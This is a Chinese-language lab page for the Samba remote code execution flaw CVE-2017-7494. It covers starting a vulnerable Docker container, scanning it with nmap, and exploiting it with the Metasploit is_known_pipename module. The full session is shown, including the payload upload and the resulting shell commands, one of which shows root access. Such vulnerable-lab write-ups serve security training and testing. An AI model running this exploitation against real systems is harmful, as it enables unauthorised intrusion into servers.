Samba远程代码执行漏洞(CVE-2017-7494)
漏洞信息

2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。

    Remote code execution from a writable share.

镜像信息
类型 	值
samba 端口 	445
获取环境:

    拉取镜像到本地

$ docker pull medicean/vulapps:s_samba_1

    启动环境

$ docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1

    -p 445:445 前面的 445 代表物理机的端口

利用步骤

msf exploit(ms17_010_eternalblue) > db_nmap 172.18.0.*
[*] Nmap: Starting Nmap 7.01 ( https://nmap.org ) at 2017-08-31 17:39 CST
[*] Nmap: Nmap scan report for 172.18.0.2
[*] Nmap: Host is up (0.0000060s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 139/tcp open  netbios-ssn
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: MAC Address: 02:42:AC:12:00:02 (Unknown)
[*] Nmap: Nmap scan report for 172.18.0.1
[*] Nmap: Host is up (-190s latency).
[*] Nmap: Not shown: 995 closed ports
[*] Nmap: PORT    STATE    SERVICE
[*] Nmap: 22/tcp  open     ssh
[*] Nmap: 80/tcp  open     http
[*] Nmap: 139/tcp filtered netbios-ssn
[*] Nmap: 443/tcp open     https
[*] Nmap: 445/tcp filtered microsoft-ds
[*] Nmap: Nmap done: 256 IP addresses (2 hosts up) scanned in 3.17 seconds
msf > use exploit/linux/samba/is_known_pipename
msf exploit(is_known_pipename) > set RHOST 172.18.0.2
RHOST => 172.18.0.2
msf exploit(is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOST           172.18.0.2 	    yes       The target address
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_BASE                   no        The remote filesystem path correlating with the SMB share name
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   2   Linux x86_64


msf exploit(is_known_pipename) > run

[*] 172.18.0.2:445 - Using location \\172.18.0.2\share\ for the path
[*] 172.18.0.2:445 - Retrieving the remote path of the share 'share'
[*] 172.18.0.2:445 - Share 'share' has server-side path '/tmp/
[*] 172.18.0.2:445 - Uploaded payload to \\172.18.0.2\share\yaEQxteE.so
[*] 172.18.0.2:445 - Loading the payload from server-side path /tmp/yaEQxteE.so using \\PIPE\/tmp/yaEQxteE.so...
[-] 172.18.0.2:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 172.18.0.2:445 - Loading the payload from server-side path /tmp/yaEQxteE.so using /tmp/yaEQxteE.so...
[+] 172.18.0.2:445 - Probe response indicates the interactive payload was loaded...


id
uid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)

如果 smb.conf 配置了 guest account = root 这一项, 则显示如下：

id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
ps
  PID TTY          TIME CMD
    1 ?        00:00:00 start.sh
   39 ?        00:00:00 nmbd
   71 ?        00:00:00 smbd
   88 ?        00:00:00 smbd
   90 ?        00:00:00 smbd
  103 ?        00:00:00 tail
  125 ?        00:00:00 sh
  131 ?        00:00:00 ps

